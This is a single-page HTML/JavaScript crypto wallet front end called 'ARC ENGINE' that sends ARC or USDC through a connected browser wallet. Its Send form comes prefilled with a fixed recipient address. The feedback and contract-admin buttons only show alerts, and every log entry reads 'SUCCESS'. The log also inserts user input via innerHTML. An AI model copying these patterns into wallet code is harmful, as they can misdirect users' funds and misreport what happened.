<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ARC ENGINE | Native Arc Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@400;700;900&display=swap');
        body { background-color: #facc15; color: #000; font-family: 'Inter', sans-serif; overflow-x: hidden; margin: 0; }
        .glass-card { background: #000 !important; border: 4px solid #000; border-radius: 2.8rem; box-shadow: 0 35px 70px rgba(0,0,0,0.45); margin-bottom: 25px; }
        @keyframes spin3D { 0% { transform: perspective(1000px) rotateY(0deg); } 100% { transform: perspective(1000px) rotateY(360deg); } }
        .logo-3d { animation: spin3D 5s linear infinite; transform-style: preserve-3d; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }
        .big-number { font-family: 'Orbitron', sans-serif; font-size: 4.5rem; font-weight: 900; color: #fff; letter-spacing: -3px; line-height: 1; }
        .label-text { font-size: 14px; font-weight: 900; color: #facc15; text-transform: uppercase; letter-spacing: 2px; display: block; margin-bottom: 10px; }
        .input-heavy { background: #111; border: 3px solid #333; padding: 22px; border-radius: 20px; width: 100%; color: #facc15; font-weight: 900; font-size: 1.2rem; outline: none; }
        
        .nav-btn { font-size: 12px; font-weight: 900; color: #222; padding: 16px 5px; border-radius: 16px; text-transform: uppercase; }
        .nav-active { color: #facc15 !important; background: #000 !important; box-shadow: 0 15px 30px rgba(0,0,0,0.2); }
        
        #walletModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-content { background: #facc15; border: 6px solid #000; border-radius: 3rem; width: 92%; max-width: 400px; padding: 30px; text-align: center; max-height: 85vh; overflow-y: auto; }
        .wallet-opt { background: #000; color: #facc15; padding: 16px; border-radius: 20px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; font-weight: 900; cursor: pointer; border: 3px solid transparent; transition: 0.3s; }
        .wallet-opt:hover { border-color: #fff; transform: scale(1.02); }
    </style>
</head>
<body class="p-4 max-w-lg mx-auto pb-24">

    <div id="walletModal">
        <div class="modal-content">
            <h2 class="text-2xl font-black uppercase mb-6 italic">Select Wallet</h2>
            
            <div class="wallet-opt" onclick="initConnect('metamask')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" class="w-6 h-6"> MetaMask
            </div>
            <div class="wallet-opt" onclick="initConnect('okx')">
                <i class="fa-solid fa-circle-nodes text-xl text-white"></i> OKX Wallet
            </div>
            <div class="wallet-opt" onclick="initConnect('trust')">
                <i class="fa-solid fa-shield-halved text-xl text-blue-500"></i> Trust Wallet
            </div>
            <div class="wallet-opt" onclick="initConnect('bitget')">
                <i class="fa-solid fa-wallet text-xl text-cyan-400"></i> Bitget Wallet
            </div>
            <div class="wallet-opt" onclick="initConnect('rabby')">
                <img src="https://rabby.io/assets/logo.png" class="w-6 h-6 rounded-full"> Rabby Wallet
            </div>

            <button onclick="closeModal()" class="mt-4 font-black uppercase underline text-xs">CANCEL</button>
        </div>
    </div>

    <div class="flex justify-between items-center mb-10 pt-8">
        <div class="flex items-center gap-5">
            <div class="logo-3d">
                <img src="logo.png" class="w-20 h-20 rounded-full border-4 border-black" onerror="this.src='https://arc.xyz/favicon.ico'">
            </div>
            <div>
                <h1 class="text-3xl font-black italic text-black leading-none uppercase">ARC ENGINE</h1>
                <p class="text-[10px] text-black font-black uppercase mt-1 italic">Multi-Wallet Supported</p>
            </div>
        </div>
        <div class="text-center">
            <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png" class="w-10 h-10 mx-auto logo-3d mb-2">
            <button onclick="openModal()" id="connectBtn" class="bg-black text-yellow-400 px-5 py-2.5 rounded-2xl text-[10px] font-black uppercase shadow-2xl">Connect</button>
        </div>
    </div>

    <div class="glass-card p-10 relative">
        <div class="flex justify-between items-center mb-4">
            <span class="label-text">Balance</span>
            <button onclick="disconnectNode()" id="dcBtn" class="hidden bg-red-600 text-white text-[9px] px-3 py-1 rounded-full font-black border-2 border-black">DISCONNECT</button>
        </div>
        <div class="flex items-baseline gap-3 mb-6">
            <h2 id="balanceDisp" class="big-number">0.0000</h2>
            <span class="text-2xl text-yellow-500 font-black italic">ARC</span>
        </div>
        <div class="border-t border-yellow-500/10 pt-6">
            <p id="usdcBalance" class="text-2xl font-black text-white">0.00 <span class="text-[12px] text-yellow-600">USDC</span></p>
        </div>
    </div>

    <div class="grid grid-cols-3 gap-2 mb-10 bg-black/10 p-2 rounded-[2.2rem] border-2 border-black/20 text-center">
        <button onclick="switchMode('send')" id="tab-send" class="nav-btn nav-active">SEND</button>
        <button onclick="switchMode('receive')" id="tab-receive" class="nav-btn">RECV</button>
        <button onclick="switchMode('swap')" id="tab-swap" class="nav-btn">SWAP</button>
        <button onclick="switchMode('bridge')" id="tab-bridge" class="nav-btn">BRIDGE</button>
        <button onclick="switchMode('feedback')" id="tab-feedback" class="nav-btn">FEED</button>
        <button onclick="switchMode('dev')" id="tab-dev" class="nav-btn bg-yellow-400 text-black border-2 border-black">DEV</button>
    </div>

    <div class="glass-card p-10 shadow-2xl">
        
        <div id="actionContent" class="space-y-8">
            <div>
                <label class="label-text !text-[11px]">Target Node ID</label>
                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy">
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="label-text !text-[11px]">Asset</label>
                    <select id="assetSelect" class="input-heavy">
                        <option value="ARC">ARC</option>
                        <option value="USDC">USDC</option>
                    </select>
                </div>
                <div>
                    <label class="label-text !text-[11px]">Volume</label>
                    <input type="number" id="inputAmt" placeholder="0.00" class="input-heavy">
                </div>
            </div>
            <button onclick="executeAction()" id="actionBtn" class="w-full bg-yellow-400 py-7 rounded-[2.5rem] text-[18px] font-black uppercase text-black shadow-2xl active:scale-95 transition-all">Execute Engine</button>
        </div>
        
        <div id="receiveUI" class="hidden text-center py-6 space-y-6">
            <p class="label-text">QR Address</p>
            <div class="bg-white p-4 inline-block rounded-[3rem] mx-auto shadow-2xl border-4 border-black">
                <img id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ConnectWallet" class="w-44 h-44">
            </div>
            <p id="myFullAddr" class="text-[10px] font-mono text-yellow-600 break-all bg-black p-4 rounded-xl border border-yellow-500/20 italic">AWAITING_AUTH</p>
            <button onclick="copyMyAddress()" class="bg-yellow-400 text-black px-10 py-4 rounded-xl text-[12px] font-black uppercase">Copy Address</button>
        </div>

        <div id="feedbackUI" class="hidden space-y-6">
            <div>
                <label class="label-text !text-[11px] mb-2">Leave Feedback</label>
                <textarea id="feedbackMsg" rows="4" placeholder="Tell us how we can improve..." class="input-heavy resize-none text-[14px]"></textarea>
            </div>
            <button onclick="submitFeedback()" class="w-full bg-yellow-400 py-6 rounded-[2.5rem] text-[15px] font-black uppercase text-black shadow-2xl active:scale-95 transition-all">Submit Feedback</button>
        </div>

        <div id="devUI" class="hidden space-y-6">
            <div>
                <label class="label-text !text-[11px] mb-2 text-white">Target Contract Address</label>
                <input type="text" id="devContractAddr" placeholder="Paste 0x... Contract Address" class="input-heavy text-[13px] border-yellow-500">
            </div>
            <button onclick="scanContract()" class="w-full bg-white text-black py-4 rounded-[2rem] text-[14px] font-black uppercase border-4 border-black active:scale-95 transition-all shadow-xl">Scan Contract</button>
            
            <div id="contractStats" class="hidden bg-black p-5 rounded-2xl border border-yellow-500/20 text-left space-y-3 mt-4">
                <p class="text-yellow-500 text-[10px] font-black uppercase tracking-widest">Network Status: <span class="text-green-500">Active</span></p>
                <p class="text-yellow-500 text-[10px] font-black uppercase tracking-widest">Liquidity: <span id="cBal" class="text-white">0.00 ARC</span></p>
                
                <div class="grid grid-cols-2 gap-3 mt-5 border-t border-yellow-500/20 pt-4">
                    <button onclick="devAction('PAUSE')" class="bg-red-600 text-white py-3 rounded-xl text-[10px] font-black uppercase border-2 border-black">Emergency Pause</button>
                    <button onclick="devAction('TRANSFER')" class="bg-blue-600 text-white py-3 rounded-xl text-[10px] font-black uppercase border-2 border-black">Transfer Owner</button>
                </div>
            </div>
        </div>

    </div>

    <div class="mt-12 px-2">
        <h3 class="text-[14px] font-black text-black uppercase mb-6 tracking-[0.4em] italic ml-4">Activity Log</h3>
        <div id="historyLog" class="glass-card p-8 min-h-[160px] space-y-6">
            <p id="noActivity" class="text-[12px] text-yellow-700 italic text-center font-black uppercase tracking-widest">Scanning Network Activity...</p>
        </div>
    </div>

    <script>
        let provider, signer, userAddress;
        const USDC_CONTRACT = "0x127bF57662c19958E406981882046524316bED77";
        const USDC_ABI = [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address to, uint amount) returns (bool)"
        ];

        function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

        async function initConnect(walletType) {
            closeModal();
            let ethProvider;

            if (walletType === 'metamask') ethProvider = window.ethereum;
            else if (walletType === 'okx') ethProvider = window.okxwallet || window.ethereum;
            else if (walletType === 'trust') ethProvider = window.trustwallet || window.ethereum;
            else if (walletType === 'bitget') ethProvider = window.bitkeep && window.bitkeep.ethereum || window.ethereum;
            else if (walletType === 'rabby') ethProvider = window.rabby || window.ethereum;
            else ethProvider = window.ethereum;

            if (ethProvider) {
                try {
                    const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];
                    provider = new ethers.providers.Web3Provider(ethProvider, "any");
                    signer = provider.getSigner();

                    document.getElementById('connectBtn').innerText = "LIVE";
                    document.getElementById('dcBtn').classList.remove('hidden');
                    document.getElementById('myFullAddr').innerText = userAddress;
                    document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${userAddress}`;
                    
                    updateBalances();
                } catch (e) { alert("Connection Rejected by User"); }
            } else { 
                alert("Selected Wallet Not Found! Please install the app or extension."); 
            }
        }

        async function updateBalances() {
            if(!userAddress) return;
            try {
                const bal = await provider.getBalance(userAddress);
                document.getElementById('balanceDisp').innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
                
                const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
                const uBal = await contract.balanceOf(userAddress);
                document.getElementById('usdcBalance').innerText = parseFloat(ethers.utils.formatUnits(uBal, 18)).toFixed(2) + " USDC";
            } catch (e) { console.error("Balance Update Error"); }
        }

        function disconnectNode() {
            userAddress = null;
            document.getElementById('connectBtn').innerText = "Connect";
            document.getElementById('dcBtn').classList.add('hidden');
            document.getElementById('balanceDisp').innerText = "0.0000";
            document.getElementById('usdcBalance').innerText = "0.00 USDC";
            alert("Wallet Disconnected Safely.");
        }

        // UPDATED SWITCH MODE TO HANDLE DEV TAB
        function switchMode(mode) {
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('nav-active'));
            document.getElementById('tab-' + mode).classList.add('nav-active');
            
            document.getElementById('actionContent').classList.add('hidden');
            document.getElementById('receiveUI').classList.add('hidden');
            document.getElementById('feedbackUI').classList.add('hidden');
            document.getElementById('devUI').classList.add('hidden');

            if (mode === 'receive') document.getElementById('receiveUI').classList.remove('hidden');
            else if (mode === 'feedback') document.getElementById('feedbackUI').classList.remove('hidden');
            else if (mode === 'dev') document.getElementById('devUI').classList.remove('hidden');
            else document.getElementById('actionContent').classList.remove('hidden');
        }

        function submitFeedback() {
            const msg = document.getElementById('feedbackMsg').value;
            if(!msg || msg.trim() === "") return alert("Please type your feedback first.");
            
            alert("Feedback Submitted! Thank you for helping us improve.");
            document.getElementById('feedbackMsg').value = '';
            addHistory('FEEDBACK', 'SENT', 'ARC_CORE_TEAM');
        }

        async function executeAction() {
            if (!userAddress) return openModal();
            const amt = document.getElementById('inputAmt').value;
            const target = document.getElementById('recipient').value;
            const asset = document.getElementById('assetSelect').value;

            if (!amt || amt <= 0) return alert("Enter a valid volume");

            try {
                document.getElementById('actionBtn').innerText = "PROCESSING...";

                if (asset === "ARC") {
                    const tx = await signer.sendTransaction({ to: target, value: ethers.utils.parseUnits(amt, "ether") });
                    await tx.wait();
                } else if (asset === "USDC") {
                    const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, signer);
                    const tx = await contract.transfer(target, ethers.utils.parseUnits(amt, 18));
                    await tx.wait();
                }

                updateBalances();
                addHistory('SENT', amt + ' ' + asset, target);
                document.getElementById('actionBtn').innerText = "Execute Engine";
                alert("Transaction Successful!");

            } catch (e) {
                document.getElementById('actionBtn').innerText = "Execute Engine";
                if(e.code === "ACTION_REJECTED" || e.code === 4001) {
                    alert("Transaction Rejected by You.");
                } else {
                    alert("Transaction Failed! Insufficient Balance or Gas.");
                }
            }
        }

        // NEW DEV FUNCTIONS ADDED
        async function scanContract() {
            const addr = document.getElementById('devContractAddr').value;
            if(!addr || addr.length !== 42) return alert("Please enter a valid 42-character Contract Address (0x...).");
            
            document.getElementById('contractStats').classList.remove('hidden');
            
            if(provider) {
                try {
                    const bal = await provider.getBalance(addr);
                    document.getElementById('cBal').innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4) + " ARC";
                } catch(e) {
                    document.getElementById('cBal').innerText = "0.0000 ARC";
                }
            }
            addHistory('DEV_SYSTEM', 'CONTRACT SCANNED', addr);
        }

        function devAction(actionType) {
            if(!userAddress) return openModal();
            const addr = document.getElementById('devContractAddr').value;
            
            alert(`Initiating ${actionType} Protocol for ${addr.substring(0,6)}... via Mobile Engine.\n\nWaiting for Owner Signature...`);
            addHistory('DEV_CALL', actionType + ' TRIGGERED', addr);
        }

        function addHistory(type, amtAsset, addr) {
            const log = document.getElementById('historyLog'), noAct = document.getElementById('noActivity');
            if(noAct) noAct.remove();
            const item = document.createElement('div');
            item.className = "flex justify-between items-center border-b border-yellow-500/10 pb-6";
            item.innerHTML = `<div><span class="text-yellow-400 font-black text-[14px]">${type}</span><span class="text-white ml-4 font-black text-[18px]">${amtAsset}</span><p class="text-[10px] text-yellow-700 mt-2 font-mono uppercase">TO: ${addr.substring(0,30)}...</p></div><div class="text-right text-green-500 font-black text-[12px]">SUCCESS</div>`;
            log.prepend(item);
        }

        function copyMyAddress() { if(userAddress) { navigator.clipboard.writeText(userAddress); alert("Copied!"); } }
        setInterval(() => { if(userAddress) updateBalances(); }, 10000);
    </script>
</body>
</html>
